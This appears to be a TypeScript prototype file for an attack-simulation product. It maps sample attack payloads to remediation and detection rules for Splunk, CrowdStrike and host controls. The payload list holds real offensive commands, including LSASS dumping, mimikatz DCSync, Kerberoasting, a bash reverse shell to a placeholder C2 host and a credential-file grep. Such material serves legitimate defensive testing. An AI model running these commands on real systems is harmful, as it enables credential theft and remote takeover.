import { useSyncExternalStore } from 'react';

import {
  type CollectorType,
  type ControlType,
  ITEM_APPLICATION,
  type Platform,
  type RemediationMitigationCategory,
  type RemediationMitigationItem,
  SAMPLE_ITEMS,
} from './remediationMitigationMock';

// ---------------------------------------------------------------------------------------------
// PROTOTYPE - SAMPLE DATA ONLY. In-memory store behind the Remediation / Mitigation tabs: nothing
// is persisted, sent to the backend or sent to XTM One. Every "AI" action is simulated with a short
// delay and canned output. `resetMockData` restores the initial state.
// ---------------------------------------------------------------------------------------------

export type Verdict = 'met' | 'not_met' | 'not_evaluated';

// Every SIEM / EDR product, with the control types it can do. A product we do not support yet is still
// listed under the control types it could do, so the product picture is complete. Product names are
// proper nouns, never translated.
export interface Vendor {
  id: string;
  label: string;
  kind: 'SIEM' | 'EDR';
  controls: ControlType[];
  // Set when OpenAEV can generate and show rules for the product.
  collector?: CollectorType;
}

export const VENDORS: Vendor[] = [
  {
    id: 'splunk',
    label: 'Splunk',
    kind: 'SIEM',
    controls: ['detection'],
    collector: 'splunk',
  },
  {
    id: 'crowdstrike',
    label: 'CrowdStrike',
    kind: 'EDR',
    controls: ['detection', 'prevention'],
    collector: 'crowdstrike',
  },
  {
    id: 'microsoft_sentinel',
    label: 'Microsoft Sentinel',
    kind: 'SIEM',
    controls: ['detection'],
  },
  {
    id: 'elastic_security',
    label: 'Elastic Security',
    kind: 'SIEM',
    controls: ['detection'],
  },
  {
    id: 'microsoft_defender',
    label: 'Microsoft Defender',
    kind: 'EDR',
    controls: ['detection', 'prevention'],
  },
  {
    id: 'palo_alto_cortex',
    label: 'Palo Alto Cortex XDR',
    kind: 'EDR',
    controls: ['detection', 'prevention'],
  },
  {
    id: 'sentinelone',
    label: 'SentinelOne',
    kind: 'EDR',
    controls: ['detection', 'prevention'],
  },
];

export interface MockPayload {
  id: string;
  name: string;
  description: string;
  platform: Platform;
  arch: string;
  command: string;
  attack_techniques: string[];
  elevation_required: boolean;
  agent_privilege: 'admin' | 'standard';
}

// Payloads of the sample data. Commands are the real ones of the tools they simulate. The last one has an
// EMPTY description on purpose.
export const MOCK_PAYLOADS: MockPayload[] = [
  {
    id: 'kerberoasting',
    name: 'Kerberoasting',
    description: 'Requests Kerberos service tickets for accounts with a service principal name and extracts them for offline cracking.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'Invoke-Kerberoast -OutputFormat Hashcat | Out-File #{output_path}',
    attack_techniques: ['T1558.003'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'asrep-roasting',
    name: 'AS-REP roasting',
    description: 'Requests authentication material for accounts that do not require Kerberos pre-authentication.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'Get-ASREPHash -UserName #{target_user}',
    attack_techniques: ['T1558.004'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'anonymous-smb-share',
    name: 'Anonymous SMB share access',
    description: 'Lists and reads network shares that accept anonymous or unauthenticated access.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'net view \\\\#{target_host} /all',
    attack_techniques: ['T1135', 'T1021.002'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'delegation-abuse',
    name: 'Unconstrained delegation abuse',
    description: 'Monitors a host trusted for unconstrained delegation and captures the Kerberos tickets (TGT) of the users and computers that authenticate to it.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'Rubeus.exe monitor /interval:5 /nowrap',
    attack_techniques: ['T1558', 'T1134'],
    elevation_required: true,
    agent_privilege: 'admin',
  },
  {
    id: 'lsass-dump',
    name: 'LSASS credential dump',
    description: 'Dumps the memory of the LSASS process to a file to extract the credentials of the logged-on users.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'procdump.exe -accepteula -ma lsass.exe #{dump_path}',
    attack_techniques: ['T1003.001'],
    elevation_required: true,
    agent_privilege: 'admin',
  },
  {
    id: 'dcsync',
    name: 'DCSync',
    description: 'Asks a domain controller to replicate the password data of an account, as another domain controller would.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'mimikatz.exe "lsadump::dcsync /domain:#{domain} /user:krbtgt" exit',
    attack_techniques: ['T1003.006'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'nopac',
    name: 'Machine account creation (noPac)',
    description: 'Creates a computer account as a standard domain user, the first step of the noPac attack chain (CVE-2021-42278 and CVE-2021-42287).',
    platform: 'windows',
    arch: 'x86_64',
    command: 'New-MachineAccount -MachineAccount #{machine_name} -Password $(ConvertTo-SecureString "#{password}" -AsPlainText -Force)',
    attack_techniques: ['T1136.002', 'T1068'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'llmnr-poisoning',
    name: 'LLMNR and NBT-NS poisoning',
    description: 'Answers LLMNR and NetBIOS name queries on the local subnet to capture the NTLM authentication of the hosts that ask.',
    platform: 'windows',
    arch: 'x86_64',
    command: 'Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y',
    attack_techniques: ['T1557.001'],
    elevation_required: true,
    agent_privilege: 'admin',
  },
  {
    id: 'openssh-regresshion',
    name: 'OpenSSH regreSSHion check (CVE-2024-6387)',
    description: 'Checks whether the SSH server runs a version affected by CVE-2024-6387, the signal handler race condition fixed in OpenSSH 9.8p1.',
    platform: 'linux',
    arch: 'x86_64',
    command: 'python3 CVE-2024-6387_Check.py #{target_host} 22',
    attack_techniques: ['T1190'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'ssh-bruteforce',
    name: 'SSH password guessing',
    description: 'Tries a list of passwords against the SSH service of a host.',
    platform: 'linux',
    arch: 'x86_64',
    command: 'hydra -l #{user} -P #{wordlist} ssh://#{target_host} -t 4',
    attack_techniques: ['T1110.001'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'linux-reverse-shell',
    name: 'Reverse shell from a web service',
    description: 'Starts an interactive shell whose input and output are redirected to a remote TCP socket.',
    platform: 'linux',
    arch: 'x86_64',
    command: 'bash -c \'bash -i >& /dev/tcp/#{c2_host}/#{c2_port} 0>&1\'',
    attack_techniques: ['T1059.004'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'linux-credential-files',
    name: 'Credentials in files',
    description: 'Searches the file system for passwords, tokens and keys stored in clear text.',
    platform: 'linux',
    arch: 'x86_64',
    command: 'grep -rIE "(password|passwd|api[_-]?key)[[:space:]]*[=:]" /home /opt /etc 2>/dev/null',
    attack_techniques: ['T1552.001'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'macos-gatekeeper-bypass',
    name: 'Gatekeeper bypass',
    description: 'Removes the quarantine attribute of a downloaded application and launches it, so Gatekeeper does not check it.',
    platform: 'macos',
    arch: 'arm64',
    command: 'xattr -d com.apple.quarantine #{app_path} && open #{app_path}',
    attack_techniques: ['T1553.001'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'macos-remote-login',
    name: 'Remote login over SSH (macOS)',
    description: 'Connects to the SSH service of a Mac with a valid account and runs a command.',
    platform: 'macos',
    arch: 'arm64',
    command: 'ssh #{user}@#{target_host} id',
    attack_techniques: ['T1021.004'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'log4shell-nuclei-scan',
    name: 'Log4Shell (CVE-2021-44228) vulnerability check',
    description: 'Safe canary-based check: sends a JNDI lookup string in a request header and waits for a callback on a canary domain. No code is run on the target even if it is vulnerable.',
    platform: 'linux',
    arch: 'x86_64',
    command: `curl -s -H "X-Api-Version: ${'$'}{jndi:ldap://#{canary_domain}/a}" "#{target_url}" -o /dev/null`,
    attack_techniques: ['T1190'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'zerologon-check',
    name: 'Zerologon (CVE-2020-1472) vulnerability check',
    description: 'Checks whether a domain controller is vulnerable to Zerologon (CVE-2020-1472), a flaw in the Netlogon secure channel. The check only tries to authenticate with an all-zero challenge and never changes the machine account password.',
    platform: 'linux',
    arch: 'x86_64',
    command: 'python3 zerologon_tester.py #{dc_name} #{dc_ip}',
    attack_techniques: ['T1210'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
  {
    id: 'service-enumeration',
    name: 'Local service enumeration',
    // Empty on purpose: shows the "thin context" warning in the XTM One request preview.
    description: '',
    platform: 'linux',
    arch: 'ALL_ARCHITECTURES',
    command: 'systemctl list-units --type=service --state=running',
    attack_techniques: ['T1007'],
    elevation_required: false,
    agent_privilege: 'standard',
  },
];

// Which sample items each payload starts with. An item can appear on several payloads. A control type
// with no item is on purpose: some weaknesses have no patch, and normal administration has nothing to
// remediate (the tab then shows XTM One's "no suggestion" state).
const PAYLOAD_ITEM_IDS: Record<string, string[]> = {
  'kerberoasting': [
    'sample-rem-kerberoasting-service-accounts',
    'sample-mit-splunk-kerberoasting-spl',
    'sample-mit-splunk-spn-change-spl',
    'sample-mit-crowdstrike-kerberoasting-ioa',
    'sample-mit-crowdstrike-kerberoasting-prevention',
  ],
  'asrep-roasting': [
    'sample-rem-asrep-preauth',
    'sample-mit-splunk-asrep-spl',
  ],
  'anonymous-smb-share': [
    'sample-rem-smb-anonymous-access',
    'sample-rem-smb-signing',
    'sample-mit-splunk-anonymous-share-spl',
    'sample-mit-generic-smb-scope',
  ],
  'delegation-abuse': [
    'sample-rem-restrict-delegation',
    'sample-mit-splunk-delegation-change-spl',
    'sample-mit-generic-disable-spooler',
  ],
  'lsass-dump': [
    'sample-rem-lsa-protection',
    'sample-rem-laps',
    'sample-mit-crowdstrike-lsass-ioa',
    'sample-mit-crowdstrike-temp-exec-prevention',
    'sample-mit-generic-sysmon-lsass',
    'sample-mit-generic-asr-lsass',
  ],
  'dcsync': [
    'sample-rem-dcsync-permissions',
    'sample-rem-krbtgt-rotation',
    'sample-mit-splunk-dcsync-spl',
  ],
  'nopac': [
    'sample-rem-kerberos-security-update',
    'sample-rem-machine-account-quota',
    'sample-mit-splunk-samaccountname-spl',
  ],
  'llmnr-poisoning': [
    'sample-rem-disable-llmnr',
    'sample-rem-smb-signing',
  ],
  'openssh-regresshion': [
    'sample-rem-linux-package-update',
    'sample-mit-generic-sshd-logingracetime',
    'sample-mit-generic-linux-block-ssh-source',
  ],
  'ssh-bruteforce': [
    'sample-rem-linux-ssh-hardening',
    'sample-mit-splunk-ssh-bruteforce-spl',
    'sample-mit-generic-linux-block-ssh-source',
  ],
  'linux-reverse-shell': [
    'sample-mit-crowdstrike-linux-reverse-shell',
    'sample-mit-generic-linux-egress',
  ],
  'linux-credential-files': [
    'sample-rem-linux-hardcoded-secrets',
    'sample-mit-generic-auditd-shadow',
  ],
  'macos-gatekeeper-bypass': [
    'sample-rem-macos-gatekeeper',
    'sample-rem-macos-os-update',
  ],
  'macos-remote-login': [
    'sample-mit-generic-macos-remote-login',
  ],
  'zerologon-check': [
    'sample-rem-zerologon-patch',
    'sample-rem-zerologon-enforcement',
    'sample-mit-splunk-zerologon-spl',
    'sample-mit-generic-zerologon-network',
  ],
  'log4shell-nuclei-scan': [
    'sample-rem-log4shell-patch',
    'sample-rem-log4shell-jndilookup',
    'sample-mit-splunk-log4shell-spl',
    'sample-mit-generic-log4shell-waf',
  ],
  // Listing the running services is normal administration: nothing to remediate, nothing to block.
  'service-enumeration': [],
};

// A name that matches no sample payload gets a stable one (same name, same payload).
export const resolvePayload = (name?: string | null): MockPayload => {
  const lower = (name ?? '').toLowerCase();
  const keywords: [string, string][] = [
    ['as-rep', 'asrep-roasting'],
    ['asrep', 'asrep-roasting'],
    ['kerberoast', 'kerberoasting'],
    ['delegation', 'delegation-abuse'],
    ['lsass', 'lsass-dump'],
    ['dcsync', 'dcsync'],
    ['nopac', 'nopac'],
    ['machine account', 'nopac'],
    ['llmnr', 'llmnr-poisoning'],
    ['responder', 'llmnr-poisoning'],
    ['inveigh', 'llmnr-poisoning'],
    ['regresshion', 'openssh-regresshion'],
    ['cve', 'openssh-regresshion'],
    ['smb', 'anonymous-smb-share'],
    ['share', 'anonymous-smb-share'],
    ['brute', 'ssh-bruteforce'],
    ['ssh', 'ssh-bruteforce'],
    ['reverse', 'linux-reverse-shell'],
    ['gatekeeper', 'macos-gatekeeper-bypass'],
    ['zerologon', 'zerologon-check'],
    ['log4j', 'log4shell-nuclei-scan'],
    ['log4shell', 'log4shell-nuclei-scan'],
    ['44228', 'log4shell-nuclei-scan'],
    ['netlogon', 'zerologon-check'],
    ['1472', 'zerologon-check'],
    ['credentials in files', 'linux-credential-files'],
  ];
  const hit = keywords.find(([keyword]) => lower.includes(keyword));
  if (hit) return MOCK_PAYLOADS.find(payload => payload.id === hit[1]) as MockPayload;
  const hash = [...lower].reduce((sum, char) => sum + char.charCodeAt(0), 0);
  return MOCK_PAYLOADS[hash % MOCK_PAYLOADS.length];
};

// ---------------------------------------------------------------------------------------------
// Store
// ---------------------------------------------------------------------------------------------

interface State {
  items: Record<string, RemediationMitigationItem[]>;
  // XTM One answered that it has no suggestion for this request: key -> reason.
  unavailable: Record<string, string>;
  noticeDismissed: boolean;
  version: number;
}

const NOTICE_KEY = 'oaev-mitigation-notice-dismissed';

const readNotice = () => {
  try {
    return window.localStorage.getItem(NOTICE_KEY) === '1';
  } catch {
    return false;
  }
};

const initialItems = (): Record<string, RemediationMitigationItem[]> => Object.fromEntries(
  Object.entries(PAYLOAD_ITEM_IDS).map(([payloadId, ids]) => [
    payloadId,
    ids.flatMap((id) => {
      const item = SAMPLE_ITEMS.find(sample => sample.id === id);
      return item
        ? [{
            ...item,
            ...ITEM_APPLICATION[item.id],
            id: `${payloadId}:${item.id}`,
            review_state: item.author_rule === 'AI' ? 'needs_review' as const : undefined,
          }]
        : [];
    }),
  ]),
);

let state: State = {
  items: initialItems(),
  unavailable: {},
  noticeDismissed: readNotice(),
  version: 0,
};

const listeners = new Set<() => void>();

const update = (patch: Partial<Omit<State, 'version'>>) => {
  state = {
    ...state,
    ...patch,
    version: state.version + 1,
  };
  listeners.forEach(listener => listener());
};

const subscribe = (listener: () => void) => {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
};

const getSnapshot = () => state;

export const useMockStore = () => useSyncExternalStore(subscribe, getSnapshot);

export const getItems = (
  store: State,
  payloadId: string,
  category: RemediationMitigationCategory,
) => (store.items[payloadId] ?? []).filter(item => item.category === category);

export const dismissNotice = () => {
  try {
    window.localStorage.setItem(NOTICE_KEY, '1');
  } catch {
    // Storage can be unavailable: the notice then only stays dismissed for this session.
  }
  update({ noticeDismissed: true });
};

export const resetMockData = () => {
  try {
    window.localStorage.removeItem(NOTICE_KEY);
  } catch {
    // Nothing to clear.
  }
  update({
    items: initialItems(),
    unavailable: {},
    noticeDismissed: false,
  });
};

const patchItems = (payloadId: string, change: (items: RemediationMitigationItem[]) => RemediationMitigationItem[]) => {
  update({
    items: {
      ...state.items,
      [payloadId]: change(state.items[payloadId] ?? []),
    },
  });
};

export const markReviewed = (payloadId: string, itemId: string) => patchItems(
  payloadId,
  items => items.map(item => (item.id === itemId
    ? {
        ...item,
        review_state: 'reviewed' as const,
      }
    : item)),
);

export const deleteItem = (payloadId: string, itemId: string) => patchItems(
  payloadId,
  items => items.filter(item => item.id !== itemId),
);

// Edits the rule text of a mitigation, or the summary of a remediation.
export const editItem = (payloadId: string, itemId: string, text: string) => patchItems(
  payloadId,
  items => items.map(item => (item.id !== itemId
    ? item
    : {
        ...item,
        ...(item.category === 'mitigation' ? { content: text } : { summary: text }),
        author_rule: item.author_rule === 'AI' ? 'AI' as const : item.author_rule,
        review_state: item.author_rule === 'AI' ? 'needs_review' as const : item.review_state,
      })),
);

// ---------------------------------------------------------------------------------------------
// Simulated generation
// ---------------------------------------------------------------------------------------------

export interface GenerateInput {
  payload: MockPayload;
  category: RemediationMitigationCategory;
  // Mitigation only.
  controlType?: Extract<ControlType, 'detection' | 'prevention'>;
  // Mitigation only: undefined means generic / host-level.
  collector?: CollectorType;
  // Attack path only: what the step observed.
  findingType?: string;
}

// Mirrors the mitigation prompt: a tool that cannot do the requested control type is unsupported.
export const unsupportedReason = (input: Pick<GenerateInput, 'controlType' | 'collector'>) => (
  input.collector === 'splunk' && input.controlType === 'prevention'
    ? 'Splunk is a detection tool: it cannot block an attack. Choose Detection, or a prevention-capable target.'
    : undefined
);

let counter = 0;

// First word of the payload command: the tool or binary that a rule can match on.
const commandTool = (command: string) => command.trim().split(/[\s|]/)[0] || 'unknown';

const escapeRegex = (value: string) => value.replace(/[.\\+*?()[\]{}^$|]/g, '\\$&');

const mitigationContent = (input: GenerateInput): {
  title: string;
  content: string;
  extra: Partial<RemediationMitigationItem>;
} => {
  const { payload, collector, controlType } = input;
  const technique = payload.attack_techniques[0] ?? 'T0000';
  const finding = input.findingType ? ` Focus: observed ${input.findingType} outcome.` : '';
  const tool = commandTool(payload.command);
  const linux = payload.platform === 'linux';
  if (collector === 'splunk') {
    return {
      title: `Detect ${payload.name} activity (Splunk)`,
      content: linux
        ? [
            'index=linux sourcetype=linux_audit type=EXECVE',
            `  a0="${tool}"`,
            '| stats count BY host, auid',
          ].join('\n')
        : [
            'index=wineventlog sourcetype="WinEventLog:Security" EventCode=4688',
            `  Process_Command_Line="*${tool}*"`,
            '| stats count BY host, Account_Name, Process_Command_Line',
          ].join('\n'),
      extra: {
        coverage_notes: `Matches the command line of ${payload.name} (${technique}). A renamed tool is not covered.${finding}`,
        false_positive_notes: 'Administration scripts that use the same tool can match. Tune the search per environment.',
        assumptions: [linux
          ? 'The audit daemon records execve calls and its log is forwarded to Splunk.'
          : 'Event 4688 with the command line ("Include command line in process creation events") is collected and forwarded to Splunk.'],
      },
    };
  }
  if (collector === 'crowdstrike') {
    const prevention = controlType === 'prevention';
    return {
      title: `${prevention ? 'Block' : 'Detect'} ${payload.name} with a CrowdStrike custom IOA`,
      content: [
        `Rule name: ${prevention ? 'Block' : 'Detect'} ${payload.name}`,
        `Severity: ${prevention ? 'Critical' : 'High'}`,
        `Tactic / Technique: ${technique}`,
        'Rule type: Process Creation',
        'Image Filename: .*',
        `Command Line: .*${escapeRegex(tool)}.*`,
        `Action: ${prevention ? 'Block Execution' : 'Detect'}`,
        ...(prevention ? ['Note: start with Monitor and review the matches before switching the action to Block Execution.'] : []),
      ].join('\n'),
      extra: {
        coverage_notes: `Matches the command line of ${payload.name}. Renamed tooling is not covered.${finding}`,
        false_positive_notes: 'Approved security tests can match. Add exclusions for authorized hosts.',
        assumptions: ['The prevention policy of the target host group allows custom IOA rules.'],
        ...(prevention ? { verify: true } : {}),
      },
    };
  }
  const prevention = controlType === 'prevention';
  if (linux) {
    return {
      title: prevention ? 'Restrict outbound traffic of the service account' : 'Audit program execution',
      content: prevention
        ? [
            '# Adapt the user name and the internal range',
            'nft add rule inet filter output meta skuid "www-data" oifname "lo" accept',
            'nft add rule inet filter output meta skuid "www-data" ct state established,related accept',
            'nft add rule inet filter output meta skuid "www-data" ip daddr 10.0.0.0/8 accept',
            'nft add rule inet filter output meta skuid "www-data" counter drop',
          ].join('\n')
        : [
            '# /etc/audit/rules.d/exec.rules, then: sudo augenrules --load',
            '-a always,exit -F arch=b64 -S execve -k exec_log',
          ].join('\n'),
      extra: {
        coverage_notes: prevention
          ? 'Blocks new connections from the service account to the internet. The weakness itself is not fixed.'
          : 'Records every program started on the host (ausearch -k exec_log). It does not alert or block by itself.',
        false_positive_notes: prevention
          ? 'Updates and calls to external services made by the account are blocked. Allow-list their destinations.'
          : 'Produces a lot of events. Filter on the executables that matter before forwarding them.',
        assumptions: [prevention ? 'The table "inet filter" and an "output" chain already exist.' : 'The audit daemon (auditd) is running and its log is collected.'],
      },
    };
  }
  const lsass = payload.attack_techniques.includes('T1003.001');
  const variant = (() => {
    if (!prevention) return 'audit' as const;
    return lsass ? 'asr' as const : 'network' as const;
  })();
  const windows = {
    audit: {
      title: 'Audit process creation with the command line',
      content: [
        'auditpol /set /subcategory:"Process Creation" /success:enable',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f',
      ].join('\n'),
      coverage: 'Writes event 4688 with the full command line, which most detections rely on. It does not alert or block by itself.',
      falsePositive: 'Command lines can contain secrets: restrict who can read the Security log.',
      assumption: 'The Security log is collected.',
    },
    asr: {
      title: 'Block credential stealing from LSASS with an attack surface reduction rule',
      content: [
        '# Audit mode first, then switch to Enabled',
        'Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions AuditMode',
      ].join('\n'),
      coverage: 'Prevents direct reads of LSASS memory by untrusted processes. The weakness itself is not fixed.',
      falsePositive: 'A legitimate application that contacts a blocked destination or reads LSASS fails. Review the audit events first.',
      assumption: 'Microsoft Defender Antivirus is the active antimalware solution.',
    },
    network: {
      title: 'Enable Microsoft Defender Network Protection in block mode',
      content: [
        '# Use AuditMode first to see what would be blocked',
        'Set-MpPreference -EnableNetworkProtection Enabled',
      ].join('\n'),
      coverage: 'Blocks connections to low-reputation destinations, which limits command and control and payload downloads. The weakness itself is not fixed.',
      falsePositive: 'A legitimate application that contacts a blocked destination fails. Review the audit events first.',
      assumption: 'Microsoft Defender Antivirus is the active antimalware solution.',
    },
  }[variant];
  return {
    title: windows.title,
    content: windows.content,
    extra: {
      coverage_notes: windows.coverage,
      false_positive_notes: windows.falsePositive,
      assumptions: [windows.assumption],
    },
  };
};

const remediationTemplate = (input: GenerateInput): Omit<RemediationMitigationItem, 'id' | 'category' | 'scope' | 'author_rule'> => {
  const { payload } = input;
  const finding = input.findingType ? ` Observed finding type: ${input.findingType}.` : '';
  return {
    control_type: 'hardening',
    title: `Remove the root cause exploited by ${payload.name}`,
    summary: `Removes the weakness that ${payload.name} (${payload.attack_techniques.join(', ')}) relies on, instead of detecting it.${finding}`,
    platform: payload.platform,
    verify: true,
    actions: [
      {
        title: 'Apply the hardening change that closes the weakness',
        steps: [
          'Identify the configuration or credential that the payload relies on.',
          'Change it to the secure setting recommended by the vendor baseline.',
          'Re-run the payload to confirm the weakness is gone.',
        ],
        prerequisites: ['Administrative rights on the affected hosts.'],
        change_risk: 'Medium: the change can affect dependent applications. Test before production.',
      },
    ],
    assumptions: ['The simulated behavior reflects the real configuration.'],
    references: [`MITRE ATT&CK: ${payload.attack_techniques.join(', ')}`],
  };
};

// Key of a request XTM One could not answer with a suggestion.
export const unavailableKey = (
  payloadId: string,
  category: RemediationMitigationCategory,
  controlType?: ControlType,
  collector?: CollectorType | 'generic',
) => [payloadId, category, controlType ?? '', collector ?? ''].join('|');

// What XTM One can answer when it has no suggestion: `unsupported = true` with a reason (see the prompts).
// Sample behaviour: listing the running services is normal administration, so there is nothing to
// remove and nothing worth blocking.
const noSuggestionReason = (input: GenerateInput): string | undefined => {
  if (input.payload.id !== 'service-enumeration') return undefined;
  if (input.category === 'remediation') {
    return 'Listing the running services is normal administration activity: there is no weakness to remove.';
  }
  return input.controlType === 'prevention'
    ? 'Blocking this command would also block legitimate administration. A detection rule is a better fit.'
    : undefined;
};

export interface GenerateResult {
  item?: RemediationMitigationItem;
  // Set when XTM One has no suggestion for the request.
  unsupported?: string;
}

// Resolves after a simulated 2 s "AI" call and adds the new item to the payload.
export const generateItem = (input: GenerateInput): Promise<GenerateResult> => new Promise((resolve) => {
  setTimeout(() => {
    const key = unavailableKey(
      input.payload.id,
      input.category,
      input.category === 'mitigation' ? input.controlType : undefined,
      input.category === 'mitigation' ? input.collector ?? 'generic' : undefined,
    );
    const reason = noSuggestionReason(input);
    if (reason) {
      update({
        unavailable: {
          ...state.unavailable,
          [key]: reason,
        },
      });
      resolve({ unsupported: reason });
      return;
    }
    if (state.unavailable[key]) {
      const { [key]: _removed, ...rest } = state.unavailable;
      update({ unavailable: rest });
    }
    counter += 1;
    const id = `${input.payload.id}:generated-${counter}`;
    let item: RemediationMitigationItem;
    if (input.category === 'remediation') {
      item = {
        ...remediationTemplate(input),
        id,
        category: 'remediation',
        scope: 'generic',
        author_rule: 'AI',
        review_state: 'needs_review',
        applies_to: `${input.payload.platform === 'linux' ? 'Linux' : 'Windows'} hosts exposed to ${input.payload.name}`,
        apply_layer: 'host',
      };
    } else {
      const generated = mitigationContent(input);
      item = {
        id,
        category: 'mitigation',
        control_type: input.controlType ?? 'detection',
        scope: input.collector ? 'vendor_specific' : 'generic',
        collector_type: input.collector,
        title: generated.title,
        summary: `Generated from the command of ${input.payload.name}. Review it before use.`,
        platform: input.payload.platform,
        author_rule: 'AI',
        review_state: 'needs_review',
        content: generated.content,
        applies_to: input.collector === 'splunk'
          ? `${input.payload.platform === 'linux' ? 'Linux' : 'Windows'} logs collected in Splunk`
          : `${input.payload.platform === 'linux' ? 'Linux' : 'Windows'} hosts${input.collector ? ' with the CrowdStrike sensor' : ''}`,
        apply_layer: input.collector === 'splunk' ? 'application' : 'host',
        ...generated.extra,
      };
    }
    patchItems(input.payload.id, items => [item, ...items]);
    resolve({ item });
  }, 2000);
});
